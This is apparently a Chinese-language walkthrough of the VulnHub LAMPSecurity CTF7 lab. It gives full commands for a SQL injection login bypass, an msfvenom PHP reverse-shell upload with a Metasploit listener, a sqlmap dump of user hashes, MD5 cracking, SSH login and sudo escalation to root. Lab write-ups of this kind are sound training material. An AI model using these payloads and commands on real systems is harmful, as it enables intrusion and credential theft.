模拟环境

靶场下载地址：https://www.vulnhub.com/entry/lampsecurity-ctf7,86/

攻击机IP：192.168.1.10

目标机IP：192.168.1.136


实战

使用NMAP扫描端口

nmap -Pn -sV 192.168.1.136

可以看到开放了很多端口，其中80、8080、901、10000是http服务，那么我们就先去尝试访问这几个端口


http://192.168.1.136/就是正常的Web页面


http://192.168.1.136:8080/login.php是一个登录的页面


看见登录页面我就先到SQL注入，先尝试使用万能密码看看能否登录，尝试一番后发现使用' or 1=1 #可以绕过。



http://192.168.1.136:10000/也是一个登录页面，尝试了万能密码无法绕过。


方法一（较复杂）

在8080端口使用万能密码登录进去之后发现存在文件上传，而且可以上传PHP文件


使用msfvenom生成PHP木马创建一个shell.php文件（使用一句话木马然后使用蚁剑连接也可以）

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f raw


将生成的代码复制到一个文件中命名为shell.php进行上传


上传成功之后就是要找到文件所上传的位置了，使用dirb扫描目录

dirb http://192.168.1.136

经过一番查找在http://192.168.1.136/assets/中找到上传的文件


在攻击机上使用msfconsole启动监听

root@kali-xmtx:~/桌面#msfconsole                                           --启动MSFmsf6 > use exploit/multi/handler                                           --选择模块exploit(multi/handler) > set payload php/meterpreter/reverse_tcp           --设置payloadmsf6 exploit(multi/handler) > set lhost 192.168.1.10                       --设置IPmsf6 exploit(multi/handler) > set lport 4444                               --设置端口msf6 exploit(multi/handler) > run                                         --运行


在浏览器中点击shell.php文件,成功反弹连接。


进入shell查看权限


输入python -c "import pty;pty.spawn('/bin/bash')"使界面变得友好。


尝试使用空密码登录数据库，登录成功


查看数据库


经过查找在website库中找到users表


查看users表，得到一些账号和MD5密文


方法二（简便）

在http://192.168.1.136:8080页面存在SQL注入，使用burp抓包，将数据包保存并命名为2.txt


使用SQLMAP

sqlmap -r 2.txt -D website -T users -C username,password --dump


在MD5解密网站上将其解密brian-my2cents


在前面的端口扫描中我们看到开放了22-SSH端口，尝试登录，登录成功。


查看权限


尝试使用sudo su提升权限，成功拿到root权限


总结

  • 网络扫描（NMAP）

  • 登录表单万能密码

  • 上传木马

  • 生成的TTY外壳

  • MYSQL登录

  • 窃取MD5密码

  • 破解的MD5哈希

  • SSH登录

  • SUDO权限升级
